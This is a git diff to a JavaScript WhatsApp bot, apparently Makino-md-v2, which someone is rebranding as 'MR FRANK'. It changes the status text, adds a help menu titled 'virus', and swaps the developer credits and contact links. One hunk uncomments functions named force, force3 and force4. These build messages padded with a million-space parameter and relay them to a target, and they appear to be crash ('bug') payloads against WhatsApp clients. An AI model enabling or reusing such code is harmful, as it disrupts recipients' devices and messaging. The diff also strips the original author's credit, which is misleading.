@@ -427,7 +427,7 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
       const uptimeInSeconds = Math.floor(process.uptime());
       const uptimeFormatted = formatTime(uptimeInSeconds);
 
-      function _0x582b(_0xabb6f8, _0x12cdd8) { const _0x58e890 = _0x58e8(); return _0x582b = function (_0x582b90, _0x4387b3) { _0x582b90 = _0x582b90 - 0x189; let _0x932613 = _0x58e890[_0x582b90]; return _0x932613; }, _0x582b(_0xabb6f8, _0x12cdd8); } function _0x58e8() { const _0x109554 = ['12896370RDSmnX', '3BgvPel', '189HbmdoW', '18854HvEPNh', '11TZHUID', '9125326EcyeIg', '464328lPaAMf', '3400722cbWEOK', '2263175KIczdo', '12TaHNqM', '2521564eqJRHK']; _0x58e8 = function () { return _0x109554; }; return _0x58e8(); } (function (_0x429d7b, _0x532ab5) { const _0x527567 = _0x582b, _0x130eb4 = _0x429d7b(); while (!![]) { try { const _0x75c57a = -parseInt(_0x527567(0x18b)) / 0x1 + -parseInt(_0x527567(0x192)) / 0x2 * (-parseInt(_0x527567(0x189)) / 0x3) + parseInt(_0x527567(0x191)) / 0x4 * (-parseInt(_0x527567(0x190)) / 0x5) + -parseInt(_0x527567(0x18f)) / 0x6 + parseInt(_0x527567(0x18d)) / 0x7 + parseInt(_0x527567(0x18e)) / 0x8 * (-parseInt(_0x527567(0x18a)) / 0x9) + parseInt(_0x527567(0x193)) / 0xa * (parseInt(_0x527567(0x18c)) / 0xb); if (_0x75c57a === _0x532ab5) break; else _0x130eb4['push'](_0x130eb4['shift']()); } catch (_0x19ea04) { _0x130eb4['push'](_0x130eb4['shift']()); } } }(_0x58e8, 0xa8dae)); const status = 'Makino-md-v2 By ᴛᴀɪʀᴀ ᴍᴀᴋɪɴᴏ alive since ' + uptimeFormatted;
+      function _0x582b(_0xabb6f8, _0x12cdd8) { const _0x58e890 = _0x58e8(); return _0x582b = function (_0x582b90, _0x4387b3) { _0x582b90 = _0x582b90 - 0x189; let _0x932613 = _0x58e890[_0x582b90]; return _0x932613; }, _0x582b(_0xabb6f8, _0x12cdd8); } function _0x58e8() { const _0x109554 = ['12896370RDSmnX', '3BgvPel', '189HbmdoW', '18854HvEPNh', '11TZHUID', '9125326EcyeIg', '464328lPaAMf', '3400722cbWEOK', '2263175KIczdo', '12TaHNqM', '2521564eqJRHK']; _0x58e8 = function () { return _0x109554; }; return _0x58e8(); } (function (_0x429d7b, _0x532ab5) { const _0x527567 = _0x582b, _0x130eb4 = _0x429d7b(); while (!![]) { try { const _0x75c57a = -parseInt(_0x527567(0x18b)) / 0x1 + -parseInt(_0x527567(0x192)) / 0x2 * (-parseInt(_0x527567(0x189)) / 0x3) + parseInt(_0x527567(0x191)) / 0x4 * (-parseInt(_0x527567(0x190)) / 0x5) + -parseInt(_0x527567(0x18f)) / 0x6 + parseInt(_0x527567(0x18d)) / 0x7 + parseInt(_0x527567(0x18e)) / 0x8 * (-parseInt(_0x527567(0x18a)) / 0x9) + parseInt(_0x527567(0x193)) / 0xa * (parseInt(_0x527567(0x18c)) / 0xb); if (_0x75c57a === _0x532ab5) break; else _0x130eb4['push'](_0x130eb4['shift']()); } catch (_0x19ea04) { _0x130eb4['push'](_0x130eb4['shift']()); } } }(_0x58e8, 0xa8dae)); const status = 'ℓσα∂ ɱɾ ƒɾαɳҡ αℓเѵε sเɳcε' + uptimeFormatted;
 
       Taira.setStatus(status); // Set the status using Taira.setStatus or your equivalent method
 
@@ -436,7 +436,7 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
       setTimeout(updateStatus, randomTime);
     }
     updateStatus();
-/*const force = {
+const force = {
 key: {
 participant: `0@s.whatsapp.net`,
 ...(m.chat ? {
@@ -511,7 +511,7 @@ async function force3(target, quoted) {
         text: ""
       },
       footer: {
-        text: "›          #MakinoByTaira"
+        text: "›          #MrFrank"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -561,7 +561,7 @@ async function force4(target, quoted) {
       }
     }), { userJid: target, quoted: tbug });
 await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
-}*/
+}
 
 async function loading () {
 var loaded = [
@@ -5508,7 +5508,7 @@ case 'tovv': {
           await Taira.sendMessage(from, { react: { text: "📄", key: m.key } });
          const helpMenuText = `
 ╭════════════════ ᐖ
-┃〘 *☛🐦Makino-md-v2☚* 〙
+┃〘 *ѵเɾµs* 〙
 ╰════════════════ ᐖ
 ╭════════════════ ᐖ
 ┃
@@ -5521,10 +5521,10 @@ case 'tovv': {
 ┃   *Rᴜɴᴛɪᴍᴇ* : *${runtime(process.uptime())}*
 ┃   *RAM*  : *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
 ┃   ⌯CPU* : *${totalCpuUsage}%*
-┃   *Developer* : *Tᴀɪʀᴀ Mᴀᴋɪɴᴏ*
+┃   *Developer* : *MR FRANK*
 ┃
 ╰════════════════ ᐖ
-> Taira_Tech
+> ɱɾ ƒɾαɳҡ σƒc
  ✧✧✧✧✧✧✧✧✧✧✧✧✧ 
  
 ╭════════════════ ⪩
@@ -5778,7 +5778,7 @@ case 'tovv': {
                     text: helpMenuText
                   }),
                   footer: proto.Message.InteractiveMessage.Footer.create({
-                    text: "            🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ"
+                    text: "            ρσωεɾε∂ ɓყ ɱɾ ƒɾαɳҡ σƒc"
                   }),
                   header: proto.Message.InteractiveMessage.Header.create({
                     ...(await prepareWAMessageMedia({ image: { url: 'https://graph.org/file/b06744135f2f12ec4b4be.jpg' } }, { upload: Taira.waUploadToServer })),
@@ -5792,7 +5792,7 @@ case 'tovv': {
                     buttons: [
                       {
                         "name": "quick_reply",
-                        "buttonParamsJson": `{"display_text":"OWNER 🫠","id":'${prefix}owner'}`
+                        "buttonParamsJson": `{"display_text":"OWNER ","id":'${prefix}owner'}`
                       },
 	              {
                         "name": "quick_reply",
@@ -5800,16 +5800,16 @@ case 'tovv': {
                       },
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": `{"display_text":"REPO 🔗 ","url":"https://github.com/anonphoenix007/MAKINO-MD-V2","merchant_url":"https://github.com/anonphoenix007/MAKINO-MD-V2"}`
+                        "buttonParamsJson": `{"display_text":"REPO 🔗 ","url":"wa.me/2633719647303","merchant_url":"https://github.com/anonphoenix007/MAKINO-MD-V2"}`
 
                       },
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": `{"display_text":"Channel 📰","url":"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K","merchant_url":"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K"}`
+                        "buttonParamsJson": `{"display_text":"Channel 📰","url":"wa.me/263719647303","merchant_url":"https://whatsapp.com/channel/0029VaY0Zq32P59piTo5rg0K"}`
                       },
                       {
                         "name": "cta_url",
-                        "buttonParamsJson": `{"display_text":"Taira 🫡","url":"https://wa.me/2347080968564","merchant_url":"https://wa.me/2347080968564"}`
+                        "buttonParamsJson": `{"display_text":"DEVELOPER 🫡","url":"https://wa.me/263719647303","merchant_url":"https://wa.me/2347080968564"}`
                       }
                     ]
                   })
